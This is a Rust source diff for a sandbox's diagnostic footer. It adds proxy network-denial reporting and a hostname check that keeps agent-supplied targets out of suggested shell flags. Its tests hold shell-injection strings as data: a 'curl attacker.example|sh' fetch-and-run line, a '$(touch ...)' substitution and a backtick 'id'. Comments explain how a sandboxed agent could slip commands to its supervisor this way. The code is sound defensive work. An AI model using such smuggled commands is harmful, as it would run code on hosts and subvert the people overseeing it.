@@ -353,6 +353,43 @@ fn format_command_failed_not_sandbox_line(exit_code: i32) -> String {
     )
 }
 
+/// Whether a proxy-denied target is safe to embed in a copy-pasteable
+/// `--allow-domain` suggestion.
+///
+/// The target originates from an agent-controlled connection request.
+/// `sanitize_for_diagnostic` strips control characters and ANSI escapes,
+/// but shell metacharacters (`;`, `|`, `$()`, backticks, spaces, quotes)
+/// survive it — and a suggestion line is exactly the text a supervisor may
+/// copy into a shell. Only the strict hostname alphabet is allowed; anything
+/// else is displayed in the denial listing but never offered as a command.
+fn is_shell_safe_hostname(host: &str) -> bool {
+    !host.is_empty()
+        && host
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '*'))
+}
+
+/// Footer label for a network audit decision.
+///
+/// Allow-class decisions never reach the footer (the caller filters to
+/// denials), but the match stays total and honest so a variant slipping
+/// through is labeled as what it is, never misreported as a denial.
+fn network_denial_decision_label(decision: &nono::undo::NetworkAuditDecision) -> &'static str {
+    match decision {
+        nono::undo::NetworkAuditDecision::Deny => "deny",
+        nono::undo::NetworkAuditDecision::ApproveDenied => "approval_denied",
+        nono::undo::NetworkAuditDecision::ApproveTimeout => "approval_timeout",
+        nono::undo::NetworkAuditDecision::ApproveError => "approval_error",
+        nono::undo::NetworkAuditDecision::Allow => "allow",
+        nono::undo::NetworkAuditDecision::ApproveRequested => "approval_requested",
+        nono::undo::NetworkAuditDecision::ApproveGranted => "approval_granted",
+    }
+}
+
+fn format_allow_net_help_line() -> String {
+    "[nono]   --allow-net        unrestricted network for this session".to_string()
+}
+
 fn format_command_succeeded_with_stderr_line() -> String {
     "[nono] The command succeeded, but stderr showed a likely sandbox-related access issue."
         .to_string()
@@ -637,6 +674,11 @@ pub struct DiagnosticFormatter<'a> {
     canonical_denial_paths: Vec<PathBuf>,
     /// Pre-built diagnostics; when empty, [`Self::format_footer`] builds a report on demand.
     session_diagnostics: &'a [nono::NonoDiagnostic],
+    /// Network denial events observed by the proxy during this session.
+    /// Authoritative (the proxy's own decisions), unlike the stderr-derived
+    /// `network_blocked_hint`. Populated only in supervised mode with an
+    /// active proxy.
+    network_denials: Vec<nono::undo::NetworkAuditEvent>,
 }
 
 impl<'a> DiagnosticFormatter<'a> {
@@ -664,6 +706,7 @@ impl<'a> DiagnosticFormatter<'a> {
             suppressed_system_service_operations: &[],
             canonical_denial_paths: Vec::new(),
             session_diagnostics: &[],
+            network_denials: Vec::new(),
         }
     }
 
@@ -850,6 +893,17 @@ impl<'a> DiagnosticFormatter<'a> {
     #[must_use]
     pub fn with_session_id(mut self, session_id: Option<String>) -> Self {
         self.session_id = session_id;
+        self
+    }
+
+    /// Add network denial events observed by the proxy during this session.
+    ///
+    /// Callers should pass only denial-class decisions (`Deny`,
+    /// `ApproveDenied`, `ApproveTimeout`, `ApproveError`); allowed traffic
+    /// has no place in a failure diagnostic.
+    #[must_use]
+    pub fn with_network_denials(mut self, denials: Vec<nono::undo::NetworkAuditEvent>) -> Self {
+        self.network_denials = denials;
         self
     }
 
@@ -1178,10 +1232,14 @@ impl<'a> DiagnosticFormatter<'a> {
         };
         self.format_likely_sandbox_list(&mut lines, additional);
 
-        if self.blocked_protected_file.is_none() && !has_stderr_findings {
+        // Same evidence rule as the supervised footer: path grants and path
+        // queries are prescribed only when this session named a path.
+        if self.blocked_protected_file.is_none()
+            && !has_stderr_findings
+            && self.has_observed_path_evidence(diagnostics)
+        {
             lines.push("[nono]".to_string());
-            self.format_grant_help(&mut lines);
-            lines.push("[nono]".to_string());
+            self.format_grant_help(&mut lines, diagnostics);
             self.format_follow_up_from_diagnostics(&mut lines, diagnostics);
         }
 
@@ -1204,9 +1262,17 @@ impl<'a> DiagnosticFormatter<'a> {
         let system_service_diagnostics = self.system_service_diagnostics(diagnostics);
         let has_path_findings =
             !path_diagnostics.is_empty() || !pathname_unix_diagnostics.is_empty();
+        let has_observed_path_evidence = self.has_observed_path_evidence(diagnostics);
+        let has_network_denials = !self.network_denials.is_empty();
+        let primary_protected_root_attempt = matches!(
+            primary_verdict.as_ref(),
+            Some(ErrorVerdict::LikelySandbox(hint))
+                if self.is_path_suggestion_protected(&hint.path, hint.access)
+        );
 
         if !has_path_findings
             && ipc_diagnostics.is_empty()
+            && !has_network_denials
             && matches!(
                 primary_verdict.as_ref(),
                 Some(ErrorVerdict::MissingPath(_)) | Some(ErrorVerdict::NonSandboxFailure(_))
@@ -1237,20 +1303,41 @@ impl<'a> DiagnosticFormatter<'a> {
                 self.format_system_service_diagnostics(&mut lines, &system_service_diagnostics);
                 lines.push("[nono]".to_string());
                 self.format_system_service_guidance(&mut lines, &system_service_diagnostics);
+                if has_network_denials {
+                    lines.push("[nono]".to_string());
+                    self.format_network_denial_guidance(&mut lines);
+                }
             } else {
                 if let Some(verdict) = primary_verdict.as_ref() {
                     self.format_primary_verdict_guidance(&mut lines, verdict);
                     lines.push("[nono]".to_string());
                 }
-                lines.push("[nono] No path denials were observed during this session.".to_string());
-                lines.push(
-                    "[nono] The failure may be unrelated to sandbox restrictions.".to_string(),
-                );
+                if has_network_denials {
+                    // The proxy's own denials are authoritative: never claim
+                    // the failure "may be unrelated to sandbox restrictions"
+                    // when nono itself denied network traffic.
+                    self.format_network_denial_guidance(&mut lines);
+                } else if !has_observed_path_evidence {
+                    lines.push(
+                        "[nono] No path denials were observed during this session.".to_string(),
+                    );
+                    lines.push(
+                        "[nono] The failure may be unrelated to sandbox restrictions.".to_string(),
+                    );
+                }
             }
-            lines.push("[nono]".to_string());
-            self.format_grant_help(&mut lines);
-            lines.push("[nono]".to_string());
-            self.format_follow_up_from_diagnostics(&mut lines, diagnostics);
+            if has_observed_path_evidence && !primary_protected_root_attempt {
+                lines.push("[nono]".to_string());
+                self.format_grant_help(&mut lines, diagnostics);
+                self.format_follow_up_from_diagnostics(&mut lines, diagnostics);
+            } else if !has_network_denials && stderr_network_diagnostic(diagnostics).is_some() {
+                // Same principle as has_observed_path_evidence: a blocked
+                // capability config alone isn't evidence this failure was
+                // network-related. Only a logged network denial hint earns
+                // the --allow-net suggestion.
+                lines.push("[nono]".to_string());
+                self.format_network_grant_help(&mut lines);
+            }
         } else if has_path_findings {
             self.format_consolidated_denial_guidance(
                 &mut lines,
@@ -1266,6 +1353,14 @@ impl<'a> DiagnosticFormatter<'a> {
                 lines.push("[nono]".to_string());
                 self.format_system_service_guidance(&mut lines, &system_service_diagnostics);
             }
+        }
+
+        // Path/IPC findings took the branches above without reaching the
+        // network section; append it so proxy denials are never silently
+        // dropped from the footer. The no-path/no-IPC branch prints its own.
+        if has_network_denials && (has_path_findings || !ipc_diagnostics.is_empty()) {
+            lines.push("[nono]".to_string());
+            self.format_network_denial_guidance(&mut lines);
         }
 
         lines.join("\n")
@@ -1393,7 +1488,7 @@ impl<'a> DiagnosticFormatter<'a> {
         lines: &mut Vec<String>,
         diagnostics: &[NonoDiagnostic],
     ) {
-        lines.push("[nono] Next steps:".to_string());
+        let mut steps = Vec::new();
         for diagnostic in diagnostics {
             let Some(ref remediation) = diagnostic.remediation else {
                 continue;
@@ -1401,19 +1496,19 @@ impl<'a> DiagnosticFormatter<'a> {
             match remediation {
                 NonoRemediation::RunDiscovery => {
                     if let Some(command) = self.format_command_for_run() {
-                        lines.push(format!(
+                        steps.push(format!(
                             "[nono]   Add permissions: nono run --allow <path> -- {}",
                             command
                         ));
                     } else {
-                        lines.push(
+                        steps.push(
                             "[nono]   Add permissions: nono run --allow <path> -- <your command>"
                                 .to_string(),
                         );
                     }
                 }
                 NonoRemediation::CheckPolicy => {
-                    lines.push(
+                    steps.push(
                         "[nono]   Query policy: nono why --path <path> --op <read|write|readwrite>"
                             .to_string(),
                     );
@@ -1421,6 +1516,16 @@ impl<'a> DiagnosticFormatter<'a> {
                 _ => {}
             }
         }
+
+        // A bare "Next steps:" header with nothing under it is noise. Only the
+        // RunDiscovery and CheckPolicy remediations render a step, so emit the
+        // header (and its separator) only once one of them is present.
+        if steps.is_empty() {
+            return;
+        }
+        lines.push("[nono]".to_string());
+        lines.push("[nono] Next steps:".to_string());
+        lines.extend(steps);
     }
 
     fn format_likely_sandbox_from_diagnostic(
@@ -1451,7 +1556,12 @@ impl<'a> DiagnosticFormatter<'a> {
             path.display(),
             access_str(access),
         ));
-        if let Some(ref remediation) = diagnostic.remediation
+        if self.is_diagnostic_protected_root_blocked(diagnostic) {
+            lines.push(
+                "[nono]   This path overlaps protected nono state and cannot be granted or saved to a profile."
+                    .to_string(),
+            );
+        } else if let Some(ref remediation) = diagnostic.remediation
             && let Some(flag) = crate::query_ext::suggested_flag_for_remediation(remediation)
         {
             lines.push(format!("[nono]   Try: {flag}"));
@@ -1532,10 +1642,17 @@ impl<'a> DiagnosticFormatter<'a> {
             hint.path.display(),
             access_str(hint.access),
         ));
-        lines.push(format!(
-            "[nono]   Try: {}",
-            self.suggested_flag_for_hint(&hint.path, hint.access)
-        ));
+        if self.is_path_suggestion_protected(&hint.path, hint.access) {
+            lines.push(
+                "[nono]   This path overlaps protected nono state and cannot be granted or saved to a profile."
+                    .to_string(),
+            );
+        } else {
+            lines.push(format!(
+                "[nono]   Try: {}",
+                self.suggested_flag_for_hint(&hint.path, hint.access)
+            ));
+        }
     }
 
     fn format_primary_verdict_guidance(&self, lines: &mut Vec<String>, verdict: &ErrorVerdict) {
@@ -1626,9 +1743,12 @@ impl<'a> DiagnosticFormatter<'a> {
         let total = path_diagnostics.len();
         let mut actionable = 0usize;
         let mut policy_blocked = 0usize;
+        let mut protected_root_blocked = 0usize;
 
         for diagnostic in path_diagnostics {
-            if self.is_diagnostic_policy_blocked(diagnostic) {
+            if self.is_diagnostic_protected_root_blocked(diagnostic) {
+                protected_root_blocked += 1;
+            } else if self.is_diagnostic_policy_blocked(diagnostic) {
                 policy_blocked += 1;
             } else {
                 actionable += 1;
@@ -1647,7 +1767,9 @@ impl<'a> DiagnosticFormatter<'a> {
                 break;
             }
             let mut labels: Vec<&str> = Vec::new();
-            if self.is_diagnostic_policy_blocked(diagnostic) {
+            if self.is_diagnostic_protected_root_blocked(diagnostic) {
+                labels.push("protected nono state");
+            } else if self.is_diagnostic_policy_blocked(diagnostic) {
                 labels.push("permanently restricted");
             }
             if self.is_diagnostic_suppressed(diagnostic) {
@@ -1689,6 +1811,18 @@ impl<'a> DiagnosticFormatter<'a> {
             lines.push(format!(
                 "[nono] {}{} permanently restricted — override via a user profile with filesystem.bypass_protection.",
                 count_prefix, verb,
+            ));
+        }
+
+        if protected_root_blocked > 0 {
+            lines.push("[nono]".to_string());
+            lines.push(format!(
+                "[nono] {} protected nono state and cannot be granted or saved to a profile.",
+                if protected_root_blocked == 1 {
+                    "This path overlaps"
+                } else {
+                    "These paths overlap"
+                },
             ));
         }
     }
@@ -1770,6 +1904,24 @@ impl<'a> DiagnosticFormatter<'a> {
             .iter()
             .filter(|diagnostic| diagnostic.code == NonoDiagnosticCode::SandboxDeniedPath)
             .collect()
+    }
+
+    /// True when something in this session named a filesystem path: a logged
+    /// filesystem denial, a stderr line that looks like a sandbox denial on a
+    /// path, or a stderr "No such file" report.
+    ///
+    /// This gates the generic filesystem grant help (`--allow/--read/--write
+    /// <path>`, `nono why --path`), so it deliberately excludes pathname Unix
+    /// socket denials: those are remedied with `--allow-unix-socket`, not with
+    /// the filesystem flags. Supervised mode routes them to IPC guidance via
+    /// `has_path_findings` before this predicate is consulted; standard mode
+    /// has no such routing, so counting them here would prescribe the wrong
+    /// flags. A system-service block, an application error, or a bare non-zero
+    /// exit names no path either (issue #1646).
+    fn has_observed_path_evidence(&self, diagnostics: &[NonoDiagnostic]) -> bool {
+        !self.path_diagnostics(diagnostics).is_empty()
+            || !stderr_likely_sandbox_diagnostics(diagnostics).is_empty()
+            || stderr_missing_path_diagnostic(diagnostics).is_some()
     }
 
     fn system_service_diagnostics<'diag>(
@@ -1862,7 +2014,8 @@ impl<'a> DiagnosticFormatter<'a> {
             }
             if diagnostic.code == NonoDiagnosticCode::SandboxDeniedPath
                 && let Some(path) = &diagnostic.path
-                && self.is_path_policy_blocked(path)
+                && (self.is_path_policy_blocked(path)
+                    || self.is_diagnostic_protected_root_blocked(diagnostic))
             {
                 continue;
             }
@@ -1890,16 +2043,127 @@ impl<'a> DiagnosticFormatter<'a> {
             .is_some_and(|d| d.reason == DenialReason::PolicyBlocked)
     }
 
-    fn format_grant_help(&self, lines: &mut Vec<String>) {
+    /// Whether the suggested grant target would overlap nono's own state.
+    /// Fail closed: if the active protected roots cannot be resolved, do not
+    /// emit a grant suggestion.
+    fn is_diagnostic_protected_root_blocked(&self, diagnostic: &NonoDiagnostic) -> bool {
+        let Some(path) = diagnostic.path.as_deref() else {
+            return false;
+        };
+        let access = diagnostic.access.unwrap_or(AccessMode::Read);
+        self.is_path_suggestion_protected(path, access)
+    }
+
+    fn is_path_suggestion_protected(&self, path: &Path, access: AccessMode) -> bool {
+        let (flag, target) = crate::query_ext::suggested_flag_parts(path, access);
+        let is_file = matches!(flag, "--read-file" | "--write-file" | "--allow-file");
+        let Ok(roots) = crate::protected_paths::ProtectedRoots::from_defaults() else {
+            return true;
+        };
+        let Ok(target) = crate::profile::expand_vars(&target.to_string_lossy(), Path::new("."))
+        else {
+            return true;
+        };
+
+        crate::protected_paths::profile_save_target_overlaps_protected_root(
+            &target,
+            is_file,
+            roots.as_paths(),
+        )
+    }
+
+    /// Path grant help, plus `--allow-net` only when this session observed a
+    /// network denial.
+    ///
+    /// A blocked network capability is configuration, not evidence: a session
+    /// whose only symptom was a path denial has nothing for `--allow-net` to
+    /// attach to (issue #1646).
+    fn format_grant_help(&self, lines: &mut Vec<String>, diagnostics: &[NonoDiagnostic]) {
         lines.push("[nono] To grant additional access, re-run with:".to_string());
         lines.push("[nono]   --allow <path>     read+write access to directory".to_string());
         lines.push("[nono]   --read <path>      read-only access to directory".to_string());
         lines.push("[nono]   --write <path>     write-only access to directory".to_string());
 
-        if self.caps.is_network_blocked() {
-            lines.push(
-                "[nono]   --allow-net        unrestricted network for this session".to_string(),
-            );
+        if self.caps.is_network_blocked() && stderr_network_diagnostic(diagnostics).is_some() {
+            lines.push(format_allow_net_help_line());
+        }
+    }
+
+    /// Grant help without the path flags, for sessions that observed no path.
+    ///
+    /// Callers must check for a logged network-denial diagnostic first
+    /// (`stderr_network_diagnostic`); a blocked capability alone is not
+    /// evidence this failure was network-related.
+    fn format_network_grant_help(&self, lines: &mut Vec<String>) {
+        lines.push("[nono] To grant additional access, re-run with:".to_string());
+        lines.push(format_allow_net_help_line());
+    }
+
+    /// Render proxy-observed network denials with grant guidance.
+    ///
+    /// Unlike the stderr heuristics behind `stderr_network_diagnostic`, these
+    /// events are the proxy's own decisions, so they are proof the sandbox
+    /// denied network traffic. Targets and reasons originate from
+    /// agent-controlled requests and are sanitized before reaching the
+    /// terminal.
+    fn format_network_denial_guidance(&self, lines: &mut Vec<String>) {
+        const MAX_RENDERED_DENIALS: usize = 5;
+        const MAX_REASON_CHARS: usize = 256;
+
+        let mut seen = std::collections::HashSet::new();
+        let mut rendered: Vec<String> = Vec::new();
+        let mut denied_hosts: Vec<String> = Vec::new();
+        for event in &self.network_denials {
+            let decision = network_denial_decision_label(&event.decision);
+            let mode = crate::audit_commands::network_mode_label(&event.mode);
+            let mut target = sanitize_for_diagnostic(&event.target);
+            if let Some(port) = event.port {
+                target = format!("{target}:{port}");
+            }
+            let reason = event.reason.as_deref().map(|reason| {
+                crate::command_display::truncate_chars(
+                    &sanitize_for_diagnostic(reason),
+                    MAX_REASON_CHARS,
+                )
+            });
+            if !seen.insert((decision, mode, target.clone(), reason.clone())) {
+                continue;
+            }
+            rendered.push(match &reason {
+                Some(reason) => format!("[nono]   {decision} {mode} {target} ({reason})"),
+                None => format!("[nono]   {decision} {mode} {target}"),
+            });
+            if matches!(
+                event.denial_category,
+                Some(nono::undo::NetworkAuditDenialCategory::HostDenied)
+            ) {
+                // Fail secure: a target outside the strict hostname alphabet
+                // is shown in the listing above but never offered as a
+                // copy-pasteable flag (see is_shell_safe_hostname).
+                let host = sanitize_for_diagnostic(&event.target);
+                if is_shell_safe_hostname(&host) && !denied_hosts.contains(&host) {
+                    denied_hosts.push(host);
+                }
+            }
+        }
+
+        let total = rendered.len();
+        lines.push("[nono] Network denials were observed during this session:".to_string());
+        for line in rendered.iter().take(MAX_RENDERED_DENIALS) {
+            lines.push(line.clone());
+        }
+        if total > MAX_RENDERED_DENIALS {
+            lines.push(format!(
+                "[nono]   ...and {} more (run `nono audit show` for the full record)",
+                total - MAX_RENDERED_DENIALS
+            ));
+        }
+        if !denied_hosts.is_empty() {
+            lines.push("[nono]".to_string());
+            lines.push("[nono] To allow this traffic, re-run with:".to_string());
+            for host in denied_hosts.iter().take(MAX_RENDERED_DENIALS) {
+                lines.push(format!("[nono]   --allow-domain {host}"));
+            }
         }
     }
 
@@ -2473,6 +2737,7 @@ fn shell_quote(s: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::test_env::{ENV_LOCK, EnvVarGuard};
     use nono::capability::FsCapability;
     use tempfile::tempdir;
 
@@ -2635,8 +2900,13 @@ mod tests {
     #[test]
     fn test_standard_footer_shows_help() {
         let caps = make_test_caps();
-        let formatter = DiagnosticFormatter::new(&caps);
-        let output = formatter.format_footer(1);
+        let denials = vec![DenialRecord {
+            path: PathBuf::from("/test/project/build"),
+            access: AccessMode::Write,
+            reason: DenialReason::InsufficientAccess,
+        }];
+        let formatter = DiagnosticFormatter::new(&caps).with_denials(&denials);
+        let output = format_footer_with_session_report(formatter, 1);
 
         assert!(output.contains("--allow <path>"));
         assert!(output.contains("--read <path>"));
@@ -2644,12 +2914,61 @@ mod tests {
     }
 
     #[test]
-    fn test_standard_footer_shows_network_help_when_blocked() {
+    fn test_standard_footer_omits_help_without_observed_path_evidence() {
+        // Nothing in this session named a path, so the standard footer must
+        // not prescribe path widening or a path query (issue #1646).
         let caps = make_test_caps();
         let formatter = DiagnosticFormatter::new(&caps);
         let output = formatter.format_footer(1);
 
-        assert!(output.contains("--allow-net"));
+        assert!(output.contains("Sandbox policy:"));
+        assert!(!output.contains("To grant additional access"));
+        assert!(!output.contains("--allow <path>"));
+        assert!(!output.contains("--read <path>"));
+        assert!(!output.contains("--write <path>"));
+        assert!(!output.contains("--allow-net"));
+        assert!(!output.contains("Next steps:"));
+        assert!(!output.contains("nono why --path"));
+    }
+
+    #[test]
+    fn test_standard_footer_unix_socket_denial_omits_filesystem_flags() {
+        // A pathname Unix socket denial is remedied with --allow-unix-socket,
+        // not with the filesystem flags. Standard mode has no IPC routing, so
+        // the predicate must not treat it as filesystem path evidence.
+        let caps = make_test_caps();
+        let denials = vec![DenialRecord {
+            path: PathBuf::from("/run/user/1000/bus"),
+            access: AccessMode::Read,
+            reason: DenialReason::UnixSocketDenied,
+        }];
+        let formatter = DiagnosticFormatter::new(&caps).with_denials(&denials);
+        let output = format_footer_with_session_report(formatter, 1);
+
+        assert!(!output.contains("--allow <path>"));
+        assert!(!output.contains("--read <path>"));
+        assert!(!output.contains("--write <path>"));
+        assert!(!output.contains("To grant additional access"));
+        assert!(!output.contains("nono why --path"));
+    }
+
+    #[test]
+    fn test_standard_footer_omits_network_help_without_network_evidence() {
+        // Network is blocked by make_test_caps and a path denial was logged,
+        // but nothing observed a network symptom: the capability config alone
+        // is not evidence, so --allow-net must not be prescribed.
+        let caps = make_test_caps();
+        let denials = vec![DenialRecord {
+            path: PathBuf::from("/test/project/build"),
+            access: AccessMode::Write,
+            reason: DenialReason::InsufficientAccess,
+        }];
+        let formatter = DiagnosticFormatter::new(&caps).with_denials(&denials);
+        let output = format_footer_with_session_report(formatter, 1);
+
+        assert!(output.contains("To grant additional access, re-run with:"));
+        assert!(output.contains("--allow <path>"));
+        assert!(!output.contains("--allow-net"));
     }
 
     #[test]
@@ -3203,9 +3522,255 @@ mod tests {
 
         assert!(output.contains("No path denials were observed during this session."));
         assert!(output.contains("The failure may be unrelated to sandbox restrictions."));
-        assert!(output.contains("To grant additional access, re-run with:"));
-        assert!(output.contains("--allow <path>"));
+        // Nothing in this session named a path, so path-specific grants and
+        // path queries have nothing to attach to and must not be prescribed.
+        assert!(!output.contains("--allow <path>"));
+        assert!(!output.contains("--read <path>"));
+        assert!(!output.contains("--write <path>"));
+        assert!(!output.contains("Add permissions:"));
+        assert!(!output.contains("nono why --path"));
+        // Network is blocked by make_test_caps, but nothing in this session
+        // observed a network denial either, so --allow-net has no evidence
+        // to attach to and must not be prescribed.
+        assert!(!output.contains("To grant additional access, re-run with:"));
+        assert!(!output.contains("--allow-net"));
         assert!(!output.contains("Sandbox policy:"));
+    }
+
+    #[test]
+    fn test_supervised_no_path_evidence_network_allowed_omits_grant_help_entirely() {
+        let caps = CapabilitySet::new();
+        let formatter = DiagnosticFormatter::new(&caps).with_mode(DiagnosticMode::Supervised);
+        let output = formatter.format_footer(71);
+
+        assert!(output.contains("Command exited with code 71."));
+        assert!(output.contains("No path denials were observed during this session."));
+        assert!(output.contains("The failure may be unrelated to sandbox restrictions."));
+        assert!(!output.contains("To grant additional access"));
+        assert!(!output.contains("--allow"));
+        assert!(!output.contains("Next steps:"));
+        assert!(!output.contains("nono why --path"));
+        assert!(!output.ends_with('\n'));
+    }
+
+    fn make_denied_network_event(
+        target: &str,
+        reason: &str,
+        category: nono::undo::NetworkAuditDenialCategory,
+    ) -> nono::undo::NetworkAuditEvent {
+        nono::undo::NetworkAuditEvent {
+            timestamp_unix_ms: 0,
+            mode: nono::undo::NetworkAuditMode::Connect,
+            decision: nono::undo::NetworkAuditDecision::Deny,
+            route_id: None,
+            auth_mechanism: None,
+            auth_outcome: None,
+            managed_credential_active: None,
+            injection_mode: None,
+            denial_category: Some(category),
+            endpoint_policy_action: None,
+            endpoint_policy_rule: None,
+            approval_backend: None,
+            credential_capture_action: None,
+            credential_capture_name: None,
+            credential_capture_command: None,
+            credential_capture_argv: None,
+            credential_capture_exit_status: None,
+            credential_capture_duration_ms: None,
+            credential_capture_stdout_bytes: None,
+            credential_capture_stderr: None,
+            credential_capture_cache_scope: None,
+            credential_capture_output_format: None,
+            credential_capture_header_names: None,
+            credential_capture_stdin_mode: None,
+            credential_capture_interactive: None,
+            spiffe_context: None,
+            target: target.to_string(),
+            upstream: None,
+            port: Some(443),
+            method: None,
+            path: None,
+            status: None,
+            reason: Some(reason.to_string()),
+        }
+    }
+
+    #[test]
+    fn test_supervised_network_denial_replaces_unrelated_claim() {
+        let caps = CapabilitySet::new();
+        let formatter = DiagnosticFormatter::new(&caps)
+            .with_mode(DiagnosticMode::Supervised)
+            .with_network_denials(vec![make_denied_network_event(
+                "example.com",
+                "host example.com:443 is not in the allowlist",
+                nono::undo::NetworkAuditDenialCategory::HostDenied,
+            )]);
+        let output = formatter.format_footer(56);
+
+        assert!(output.contains("Network denials were observed during this session:"));
+        assert!(output.contains(
+            "deny connect example.com:443 (host example.com:443 is not in the allowlist)"
+        ));
+        assert!(output.contains("--allow-domain example.com"));
+        // nono's own proxy denied the request, so the footer must not claim
+        // the failure may be unrelated to sandbox restrictions.
+        assert!(!output.contains("No path denials were observed"));
+        assert!(!output.contains("may be unrelated to sandbox restrictions"));
+        assert!(!output.contains("does not look like a sandbox denial"));
+        // The authoritative per-host hint replaces the generic stderr-derived
+        // --allow-net suggestion.
+        assert!(!output.contains("--allow-net"));
+    }
+
+    #[test]
+    fn test_supervised_network_denial_dedupes_and_sanitizes() {
+        let caps = CapabilitySet::new();
+        let formatter = DiagnosticFormatter::new(&caps)
+            .with_mode(DiagnosticMode::Supervised)
+            .with_network_denials(vec![
+                make_denied_network_event(
+                    "example.com",
+                    "host example.com:443 is not in the allowlist",
+                    nono::undo::NetworkAuditDenialCategory::HostDenied,
+                ),
+                make_denied_network_event(
+                    "example.com",
+                    "host example.com:443 is not in the allowlist",
+                    nono::undo::NetworkAuditDenialCategory::HostDenied,
+                ),
+                make_denied_network_event(
+                    "evil.example\x1b[31m.com",
+                    "reason with \x1b[2J escape",
+                    nono::undo::NetworkAuditDenialCategory::HostDenied,
+                ),
+            ]);
+        let output = formatter.format_footer(56);
+
+        // Repeated identical denials (e.g. client retries) render once.
+        assert_eq!(
+            output
+                .matches(
+                    "deny connect example.com:443 (host example.com:443 is not in the allowlist)"
+                )
+                .count(),
+            1
+        );
+        // Attacker-influenced hostnames and reasons are stripped of control
+        // sequences before reaching the terminal.
+        assert!(!output.contains('\x1b'));
+        assert!(output.contains("evil.example.com"));
+        assert!(output.contains("reason with "));
+    }
+
+    #[test]
+    fn test_supervised_network_denial_shell_metacharacter_host_never_suggested() {
+        // An agent inside the sandbox controls the CONNECT target. Shell
+        // metacharacters survive sanitize_for_diagnostic (it only strips
+        // control characters and ANSI escapes), so a crafted target must
+        // never be embedded in the copy-pasteable --allow-domain suggestion,
+        // where a supervisor pasting it would execute it on the host.
+        let caps = CapabilitySet::new();
+        let formatter = DiagnosticFormatter::new(&caps)
+            .with_mode(DiagnosticMode::Supervised)
+            .with_network_denials(vec![
+                make_denied_network_event(
+                    "evil.com;curl attacker.example|sh",
+                    "host is not in the allowlist",
+                    nono::undo::NetworkAuditDenialCategory::HostDenied,
+                ),
+                make_denied_network_event(
+                    "$(touch /tmp/pwned).example.com",
+                    "host is not in the allowlist",
+                    nono::undo::NetworkAuditDenialCategory::HostDenied,
+                ),
+                make_denied_network_event(
+                    "`id`.example.com",
+                    "host is not in the allowlist",
+                    nono::undo::NetworkAuditDenialCategory::HostDenied,
+                ),
+                make_denied_network_event(
+                    "good.example.com",
+                    "host is not in the allowlist",
+                    nono::undo::NetworkAuditDenialCategory::HostDenied,
+                ),
+            ]);
+        let output = formatter.format_footer(56);
+
+        // The crafted targets may appear in the display listing, but the only
+        // --allow-domain suggestion is the strictly-valid hostname.
+        let suggested: Vec<&str> = output
+            .lines()
+            .filter(|line| line.contains("--allow-domain"))
+            .collect();
+        assert_eq!(suggested.len(), 1);
+        assert!(suggested[0].ends_with("--allow-domain good.example.com"));
+    }
+
+    #[test]
+    fn test_supervised_network_denial_non_host_category_omits_allow_domain() {
+        let caps = CapabilitySet::new();
+        let formatter = DiagnosticFormatter::new(&caps)
+            .with_mode(DiagnosticMode::Supervised)
+            .with_network_denials(vec![make_denied_network_event(
+                "api.example.com",
+                "endpoint policy denied POST /v1/admin",
+                nono::undo::NetworkAuditDenialCategory::EndpointPolicy,
+            )]);
+        let output = formatter.format_footer(56);
+
+        assert!(output.contains("Network denials were observed during this session:"));
+        assert!(output.contains("endpoint policy denied POST /v1/admin"));
+        // --allow-domain would not fix an endpoint-policy denial; suggesting
+        // it would coach the user into a broader grant than the policy needs.
+        assert!(!output.contains("--allow-domain"));
+    }
+
+    #[test]
+    fn test_supervised_system_service_only_omits_path_remedies() {
+        // A system-service block names no filesystem path (issue #1646). The
+        // operation below has no SYSTEM_SERVICE_DIAGNOSTICS entry, so this
+        // also covers the unclassified-service rendering path.
+        let caps = make_test_caps();
+        let violations = vec![SandboxViolation {
+            operation: "forbidden-sandbox-reinit".to_string(),
+            target: None,
+        }];
+        let formatter = DiagnosticFormatter::new(&caps)
+            .with_mode(DiagnosticMode::Supervised)
+            .with_sandbox_violations(&violations);
+        let output = format_footer_with_session_report(formatter, 71);
+
+        assert!(output.contains("Sandbox blocked system services:"));
+        assert!(output.contains("forbidden-sandbox-reinit"));
+        assert!(!output.contains("No path denials were observed"));
+        assert!(!output.contains("--allow <path>"));
+        assert!(!output.contains("--read <path>"));
+        assert!(!output.contains("--write <path>"));
+        assert!(!output.contains("Add permissions:"));
+        assert!(!output.contains("nono why --path"));
+        // A system-service block names no path and no network symptom; the
+        // capability config blocking network is not evidence this failure
+        // was network-related (Hermes Gate finding).
+        assert!(!output.contains("To grant additional access"));
+        assert!(!output.contains("--allow-net"));
+    }
+
+    #[test]
+    fn test_supervised_logged_path_denial_keeps_path_remedies() {
+        let caps = make_test_caps();
+        let denials = vec![DenialRecord {
+            path: PathBuf::from("/Users/alice/notes.txt"),
+            access: AccessMode::Read,
+            reason: DenialReason::InsufficientAccess,
+        }];
+        let formatter = DiagnosticFormatter::new(&caps)
+            .with_mode(DiagnosticMode::Supervised)
+            .with_denials(&denials);
+        let output = format_footer_with_session_report(formatter, 1);
+
+        assert!(output.contains("/Users/alice/notes.txt"));
+        assert!(output.contains("Fix flags: --read"));
+        assert!(!output.contains("No path denials were observed"));
     }
 
     #[test]
@@ -3240,9 +3805,65 @@ mod tests {
 
         assert!(output.contains("Sandbox denial:"));
         assert!(output.contains(&format!("Try: --read-file {}", denied.display())));
-        assert!(output.contains("No path denials were observed during this session."));
+        assert!(!output.contains("No path denials were observed during this session."));
         assert!(output.contains("Add permissions: nono run --allow <path> -- <your command>"));
         assert!(!output.contains("Sandbox policy:"));
+        // Path evidence earns the path flags; network is blocked by
+        // make_test_caps but no network symptom was observed, so --allow-net
+        // must not ride along.
+        assert!(output.contains("--allow <path>"));
+        assert!(!output.contains("--allow-net"));
+    }
+
+    #[test]
+    fn test_supervised_path_and_network_evidence_keeps_allow_net() {
+        let denied = PathBuf::from("/Users/alice/.profile");
+        let caps = make_test_caps();
+        let formatter = DiagnosticFormatter::new(&caps)
+            .with_mode(DiagnosticMode::Supervised)
+            .with_error_observation(ErrorObservation {
+                primary_verdict: None,
+                blocked_protected_file: None,
+                path_hints: vec![ObservedPathHint {
+                    path: denied,
+                    access: AccessMode::Read,
+                }],
+                missing_paths: Vec::new(),
+                non_sandbox_failure: None,
+                network_blocked_hint: true,
+            });
+        let output = formatter.format_footer(1);
+
+        // Both symptoms were observed, so both remedies are genuine.
+        assert!(output.contains("--allow <path>"));
+        assert!(output.contains("--allow-net"));
+    }
+
